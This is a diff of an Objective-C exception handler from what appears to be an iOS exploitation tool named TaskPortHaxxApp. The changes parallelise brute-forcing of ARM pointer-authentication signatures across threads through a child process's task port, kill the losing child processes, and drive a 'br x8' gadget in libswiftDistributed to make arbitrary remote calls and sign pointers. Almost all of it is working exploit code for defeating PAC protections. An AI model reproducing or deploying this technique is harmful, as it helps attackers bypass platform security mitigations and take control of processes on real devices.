@@ -1,5 +1,5 @@
 //
-//  main.m
+//  exception_handler.m
 //  TaskPortHaxxApp
 //
 //  Created by Duy Tran on 24/10/25.
@@ -24,19 +24,34 @@ _Atomic uint32_t global_result_diversifier = 0;
 static uint64_t base_count = 0;
 static int ncpu = 1;
 
-static _Thread_local int current_thread_id = 0;
-static _Thread_local sem_t local_sem_input_ready;
-static _Thread_local sem_t local_sem_output_ready;
-static _Thread_local arm_thread_state64_internal *local_new_state;
+static _Atomic int successful_thread_id = -1;
+static pid_t global_child_pids[16];
+static int global_num_child_pids = 0;
 
+void register_child_pid(int thread_id, pid_t pid) {
+    if (thread_id >= 0 && thread_id < 16) {
+        global_child_pids[thread_id] = pid;
+        if (thread_id >= global_num_child_pids) {
+            global_num_child_pids = thread_id + 1;
+        }
+    }
+}
+//
 struct thread_info {
     mach_port_t port;
     uint64_t count;
     int thread_id;
     sem_t sem_input_ready;
     sem_t sem_output_ready;
-    int num_exceptions_handled;
     arm_thread_state64_internal *new_state;
+    uint64_t pacFailedCount;
+    uint64_t pacBruteForcedPtr;
+    uint32_t lastDiversifier;
+    int first_exception;
+    int exceptions_count;
+    uint64_t bruteforce_start_time;
+    uint64_t last_report_time;
+    uint64_t last_report_count;
 };
 static struct thread_info threads[16];
 static int num_threads = 0;
@@ -106,6 +121,12 @@ void DumpRegisters(const arm_thread_state64_internal *old_state) {
            old_state->__fp, old_state->__lr, old_state->__pc, old_state->__sp, old_state->__cpsr);
 }
 
+static uint64_t get_time_usec(void) {
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    return (uint64_t)tv.tv_sec * 1000000ULL + (uint64_t)tv.tv_usec;
+}
+
 kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_port,
                                                          mach_port_t thread,
                                                          mach_port_t task,
@@ -122,43 +143,48 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         return KERN_FAILURE;
     }
 
+    struct thread_info *tinfo = get_thread_info(exception_port);
+
     const arm_thread_state64_internal *old_state = (const arm_thread_state64_internal *)old_state_;
-    local_new_state = (arm_thread_state64_internal *)new_state_;
-    memcpy(local_new_state, old_state, sizeof(arm_thread_state64_t));
+    tinfo->new_state = (arm_thread_state64_internal *)new_state_;
+    memcpy(tinfo->new_state, old_state, sizeof(arm_thread_state64_t));
     *new_state_cnt = old_state_cnt;
-
-    static _Thread_local uint64_t pacFailedCount = 0;
-    static _Thread_local uint64_t pacBruteForcedPtr = 0;
-    static _Thread_local uint32_t lastDiversifier = 0;
-
-    if (global_found) {
-        return KERN_FAILURE;
+    static _Atomic int debug_log_count = 0;
+    if (atomic_fetch_add(&debug_log_count, 1) < 20) {
+        printf("[thread %d] exception=%d code[0]=%llu code[1]=0x%llx pc=0x%llx\n",
+               tinfo->thread_id, exception, code[0], code[1], old_state->__pc);
     }
-
-    if (current_thread_id == 0) {
-        struct thread_info *tinfo = get_thread_info(exception_port);
-        current_thread_id = tinfo->thread_id;
-        local_sem_input_ready = tinfo->sem_input_ready;
-        local_sem_output_ready = tinfo->sem_output_ready;
+    if (atomic_load(&global_found) && atomic_load(&successful_thread_id) != tinfo->thread_id) {
+        __darwin_arm_thread_state64_set_pc_fptr(*tinfo->new_state,
+            ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer),
+                                         ptrauth_key_function_pointer, 0));
+        return KERN_SUCCESS;
     }
-
-    static _Thread_local int first_exception = 1;
-    if (first_exception) {
-        first_exception = 0;
+    if (tinfo->first_exception) {
+        tinfo->first_exception = 0;
         printf("got task port: %d\n", task);
         GlobalChildTaskPort = task;
         GlobalChildThreadPort = thread;
         signed_pointer = NSUserDefaults.standardUserDefaults.signedPointer;
         signed_diversifier = (uint32_t)NSUserDefaults.standardUserDefaults.signedDiversifier;
-        if (signed_pointer != 0) {
-            pacBruteForcedPtr = signed_pointer;
+        if (signed_pointer == 0) {
+            tinfo->pacBruteForcedPtr = ((uint64_t)brX8Address & 0xFFFFFFFFF) | ((tinfo->pacFailedCount << 39) & ~0x0080000000000000);
+        } else {
+            tinfo->pacBruteForcedPtr = signed_pointer;
         }
-        local_new_state->__lr = 0xFFFFFF00;
-        local_new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR;
-        local_new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR;
+        tinfo->new_state->__pc = tinfo->pacBruteForcedPtr;
+        printf("[thread %d] start 0x%016llx\n", 
+               tinfo->thread_id, tinfo->pacBruteForcedPtr); 
+        tinfo->bruteforce_start_time = get_time_usec();
+        tinfo->last_report_time = tinfo->bruteforce_start_time;
+        tinfo->last_report_count = 0;
+        tinfo->new_state->__lr = 0xFFFFFF00;
+        tinfo->new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR;
+        tinfo->new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR;
+        tinfo->exceptions_count++;
+        return KERN_SUCCESS;
     }
-
-    local_new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC; // clear some flags
+    tinfo->new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC; // clear some flags
     
     uint64_t ptrL = (uint64_t)(code[1] & 0xFFFFFFFFF);
     uint64_t ptrR = (uint64_t)(brX8Address & 0xFFFFFFFFF);
@@ -168,64 +194,96 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         (code[0] == 1 || code[0] == 257) &&
         (ptrL == ptrR || code[1] == 0xffffffffffffffff)) {
         uint32_t diversifier = old_state->__flags & 0xFF000000;
+        tinfo->lastDiversifier = diversifier;
         if (signed_pointer == 0) {
             // each thread starts at different offset in 24 bits
             // t0: [0,1,2,3,...], t1: [4M,4M+1,4M+2,...], etc.
 
-            static int total_threads = 1;
-            if (total_threads == 1) {
-                int mib[2] = {CTL_HW, HW_NCPU};
-                int cpu_count = 1;
-                size_t len = sizeof(cpu_count);
-                sysctl(mib, 2, &cpu_count, &len, NULL, 0);
-                total_threads = (cpu_count > 0 && cpu_count <= 8) ? cpu_count : 1;
-            }
-
-            uint64_t base_pac = ((uint64_t)brX8Address & 0xFFFFFFFFF);
-            uint64_t search_space = 1ULL << 24; // 24-bit PAC space
-            uint64_t thread_offset = (current_thread_id * (search_space / total_threads)) + pacFailedCount;
-            uint64_t pac_value = thread_offset & (search_space - 1); // wraparound
-
-            pacBruteForcedPtr = base_pac | ((pac_value << 39) & ~0x0080000000000000);
-        } else if (signed_pointer == pacBruteForcedPtr) {
-            pacBruteForcedPtr = signed_pointer;
+            // static int total_threads = 0;
+            // if (total_threads == 0) {
+            //     int mib[2] = {CTL_HW, HW_NCPU};
+            //     int cpu_count = 1;
+            //     size_t len = sizeof(cpu_count);
+            //     sysctl(mib, 2, &cpu_count, &len, NULL, 0);
+            //     total_threads = (cpu_count > 0 && cpu_count <= 8) ? cpu_count : 1;
+            // }
+            //
+            // uint64_t base_pac = ((uint64_t)brX8Address & 0xFFFFFFFFF);
+            // uint64_t search_space = 1ULL << 24; // 24-bit PAC space
+            // uint64_t thread_offset = (tinfo->thread_id * (search_space / total_threads)) + tinfo->pacFailedCount;
+            // uint64_t pac_value = thread_offset & (search_space - 1); // wraparound
+            //
+            // tinfo->pacBruteForcedPtr = base_pac | ((pac_value << 39) & ~0x0080000000000000);
+            tinfo->pacBruteForcedPtr = ((uint64_t)brX8Address & 0xFFFFFFFFF) | ((tinfo->pacFailedCount << 39) & ~0x0080000000000000);
+        } else if (signed_pointer == tinfo->pacBruteForcedPtr) {
+            tinfo->pacBruteForcedPtr = signed_pointer;
         }
-        lastDiversifier = diversifier;
+
+        tinfo->new_state->__pc = tinfo->pacBruteForcedPtr;
+        tinfo->pacFailedCount++;
+        if ((tinfo->pacFailedCount & 0x5ffff) == 0) {
+        uint64_t now = get_time_usec();
+        uint64_t elapsed_total = now - tinfo->bruteforce_start_time;
+        uint64_t elapsed_since_last = now - tinfo->last_report_time;
+        uint64_t guesses_since_last = tinfo->pacFailedCount - tinfo->last_report_count;
         
-        local_new_state->__pc = pacBruteForcedPtr;
-        pacFailedCount++;
-        if ((pacFailedCount & 0x3ffff) == 0) {
-            printf("Still brute forcing PAC... total: %llu\n", pacFailedCount);
-            printf("0x%016llx\n", pacBruteForcedPtr);
-        }
+        double rate_overall = (double)tinfo->pacFailedCount / (elapsed_total / 1000000.0);
+        double rate_current = (double)guesses_since_last / (elapsed_since_last / 1000000.0);
         
+        printf("[thread %d] total: %llu | overall: %.1f g/s | current: %.1f g/s | ptr: 0x%016llx\n",
+               tinfo->thread_id, tinfo->pacFailedCount, 
+               rate_overall, rate_current, tinfo->pacBruteForcedPtr);
+        
+        tinfo->last_report_time = now;
+        tinfo->last_report_count = tinfo->pacFailedCount;
+    }        
         return KERN_SUCCESS;
     } else if (ptrL != ptrR) {
         //printf("Unexpected exception code for EXC_BAD_ACCESS: code[0]=%llu code[1]=0x%016llx (expected 0x%016lx)\n", code[0], code[1]&0xFFFFFFFFF, brX8Address&0xFFFFFFFFF);
     }
     
     //printf("exception handler raise state - exception %d\n", exception);
-    static _Thread_local int exceptions_count = 0;
-    if(pacBruteForcedPtr && exceptions_count > 0) {
+    else if (!atomic_load(&global_found) && 
+        tinfo->pacBruteForcedPtr != 0) {
         static int count = 0;
         if (count < 2) {
             count++;
-            printf("PAC brute forced!\n");
-            printf("- ptr: 0x%016llx\n", pacBruteForcedPtr);
-            printf("- div: 0x%08x\n", lastDiversifier);
+            uint64_t total_time = get_time_usec() - tinfo->bruteforce_start_time;
+            double total_seconds = total_time / 1000000.0;
+            double avg_rate = (double)tinfo->pacFailedCount / total_seconds;
+            printf("thread %d bruteforced\n", tinfo->thread_id);
+            printf("- ptr: 0x%016llx\n", tinfo->pacBruteForcedPtr);
+            printf("- div: 0x%08x\n", tinfo->lastDiversifier);
+            printf("- attempts: %llu in %.2f seconds (avg %.1f g/s)\n", 
+               tinfo->pacFailedCount, total_seconds, avg_rate);
+            int expected = -1;
+            if (atomic_compare_exchange_strong(&successful_thread_id, &expected, tinfo->thread_id)) {
+                printf("thread %d: success\n", tinfo->thread_id);
+                for (int i = 0; i < global_num_child_pids; i++) {
+                  if (i != tinfo->thread_id && global_child_pids[i] > 0) {
+                    printf("kill losing %d (thread %d)\n", global_child_pids[i], i);
+                    kill(global_child_pids[i], SIGKILL);
+                    global_child_pids[i] = -1;
+                  }
+                }
+                printf("Killed %d losing children, kept thread %d\n", 
+               global_num_child_pids - 1, tinfo->thread_id);
+            }
 
             atomic_store(&global_found, true);
-            atomic_store(&global_result_ptr, pacBruteForcedPtr);
-            atomic_store(&global_result_diversifier, lastDiversifier);
+            atomic_store(&global_result_ptr, tinfo->pacBruteForcedPtr);
+            atomic_store(&global_result_diversifier, tinfo->lastDiversifier);
+            brX8Address = tinfo->pacBruteForcedPtr;
+    NSUserDefaults.standardUserDefaults.signedPointer = signed_pointer = tinfo->pacBruteForcedPtr;
+    NSUserDefaults.standardUserDefaults.signedDiversifier = tinfo->lastDiversifier;
 
-        }
-        brX8Address = pacBruteForcedPtr;
-        NSUserDefaults.standardUserDefaults.signedPointer = signed_pointer = pacBruteForcedPtr;
-        NSUserDefaults.standardUserDefaults.signedDiversifier = lastDiversifier;
+        } 
     }
+    
+    if (atomic_load(&successful_thread_id) == tinfo->thread_id) {
 
-    if (exceptions_count > 0) {
-        sem_post(&local_sem_output_ready);
+    if (tinfo->exceptions_count > 0) {
+        sem_post(&tinfo->sem_output_ready);
         if ((old_state->__lr & 0xFFFFFF00) != 0xFFFFFF00 || wantsDetach) {
             wantsDetach = NO;
             printf("Process might have crashed! unexpected lr value: 0x%llx\n", old_state->__lr);
@@ -234,10 +292,18 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         }
     }
 
-    __darwin_arm_thread_state64_set_pc_fptr(*local_new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
-    sem_wait(&local_sem_input_ready);
+    __darwin_arm_thread_state64_set_pc_fptr(*tinfo->new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
+    sem_wait(&tinfo->sem_input_ready);
 
-    exceptions_count++;
+    tinfo->exceptions_count++;
+    
+    return KERN_SUCCESS;
+    }
+    // not winning, skip
+    __darwin_arm_thread_state64_set_pc_fptr(*tinfo->new_state,
+        ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer),
+                                     ptrauth_key_function_pointer, 0));
+    tinfo->exceptions_count++;
     return KERN_SUCCESS;
 }
 
@@ -276,7 +342,11 @@ mach_port_t setup_exception_server_with_id(int thread_id) {
     tinfo->thread_id = thread_id;
     sem_init(&tinfo->sem_input_ready, 0, 0);
     sem_init(&tinfo->sem_output_ready, 0, 0);
-    tinfo->num_exceptions_handled = 0;
+    tinfo->exceptions_count = 0;
+    tinfo->pacFailedCount = 0;
+    tinfo->pacBruteForcedPtr = 0;
+    tinfo->lastDiversifier = 0;
+    tinfo->first_exception = 1;
 
     // unauthenticated br x8 gadget
     void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
@@ -334,18 +404,42 @@ mach_port_t setup_exception_server_with_id(int thread_id) {
 os_unfair_lock funcLock = OS_UNFAIR_LOCK_INIT;
 void force_crash(void)
 {
-    local_new_state->__pc = brX8Address;
-    local_new_state->__x[8] = 0x0;
-    memset(&local_new_state->__x[0], 0, sizeof(local_new_state->__x));
-    sem_post(&local_sem_input_ready);
-    sem_wait(&local_sem_output_ready);
+    int thread_id = atomic_load(&successful_thread_id);
+    if (thread_id < 0 || thread_id >= num_threads) {
+        printf("Error: No successful thread found or invalid thread ID\n");
+        return;
+    }
+    
+    struct thread_info *tinfo = &threads[thread_id];
+    arm_thread_state64_internal *new_state = tinfo->new_state;
+    
+    if (!new_state) {
+        printf("Error: new_state not initialized for thread %d\n", thread_id);
+        return;
+    }
+    
+    new_state->__pc = brX8Address;
+    new_state->__x[8] = 0x0;
+    memset(&new_state->__x[0], 0, sizeof(new_state->__x));
+    sem_post(&tinfo->sem_input_ready);
+    sem_wait(&tinfo->sem_output_ready);
 }
+
 uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int argCount) {
     // libswiftDistributed.dylib`swift_distributed_execute_target:
     // 0x20d1f0e58 <+352>: br     x8
+    int thread_id = atomic_load(&successful_thread_id);
+    if (thread_id < 0) {
+        printf("Waiting for PAC brute force to complete...\n");
+        while ((thread_id = atomic_load(&successful_thread_id)) < 0) {
+            usleep(10000); // Sleep 10ms
+        }
+        printf("Using thread %d for RemoteArbCall\n", thread_id);
+    }
 
+    struct thread_info *tinfo = &threads[thread_id];
     if (argCount > 8) {
-        uint64_t sp = local_new_state->__sp; xpaci(sp);
+        uint64_t sp = tinfo->new_state->__sp; xpaci(sp);
         for (int i = 8; i < argCount; i++) {
             RemoteWrite64(sp + sizeof(uint64_t[i-8]), args[i]);
         }
@@ -353,15 +447,15 @@ uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int arg
     }
 
     xpaci(pc);
-    local_new_state->__x[8] = pc;
-    memcpy(&local_new_state->__x[0], args, argCount * sizeof(uint64_t));
+    tinfo->new_state->__x[8] = pc;
+    memcpy(&tinfo->new_state->__x[0], args, argCount * sizeof(uint64_t));
 
     printf("Calling function %s\n", name);
-    sem_post(&local_sem_input_ready);
-    sem_wait(&local_sem_output_ready);
+    sem_post(&tinfo->sem_input_ready);
+    sem_wait(&tinfo->sem_output_ready);
 
-    printf("- function returned x0=0x%llx\n", local_new_state->__x[0]);
-    return local_new_state->__x[0];
+    printf("- function returned x0=0x%llx\n", tinfo->new_state->__x[0]);
+    return tinfo->new_state->__x[0];
 }
 
 uint64_t RemoteSignPACIA(uint64_t address, uint64_t modifier) {
@@ -370,10 +464,12 @@ uint64_t RemoteSignPACIA(uint64_t address, uint64_t modifier) {
     // 0x1b7102614 <+64>: str    x16, [x8, #0x10]
     // we're using br x8 to branch to here, and when it attempts to store to [x8],
     // it will crash and we can catch the exception to get the signed pointer
-    local_new_state->__x[16] = address;
-    local_new_state->__x[17] = modifier;
+    int thread_id = atomic_load(&successful_thread_id);
+    struct thread_info *tinfo = &threads[thread_id];
+    tinfo->new_state->__x[16] = address;
+    tinfo->new_state->__x[17] = modifier;
     RemoteArbCallInternal("pacia", paciaAddress, (uint64_t[]){}, 0);
-    return local_new_state->__x[16];
+    return tinfo->new_state->__x[16];
 }
 
 void RemoteChangeLR(uint64_t newLR) {
